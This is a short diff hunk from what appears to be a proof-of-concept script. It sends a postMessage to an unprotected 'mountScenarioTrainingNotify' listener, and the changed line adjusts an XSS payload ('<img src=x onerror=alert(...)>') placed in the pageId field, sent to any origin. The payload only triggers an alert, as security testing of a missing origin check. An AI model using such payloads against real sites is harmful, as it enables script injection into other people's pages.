@@ -44,7 +44,7 @@
                 // Construct the payload matching the unprotected mountScenarioTrainingNotify listener
                 targetTab.postMessage({
                     messageType: "mountScenarioTrainingNotify",
-                    pageId: "INJECTED_XSS_PAGE_ID_TEST_<img src=x onerror=alert(XSS Confirmed)>",
+                    pageId: "INJECTED_XSS_PAGE_ID_TEST_<img src=x onerror=alert(XSS_Confirmed)>",
                     sceneKeys: ["INJECTED_SCENE_KEY_1", "INJECTED_SCENE_KEY_2"]
                 }, "*"); // Targeting any origin (*) due to lack of origin validation
             } catch (e) {
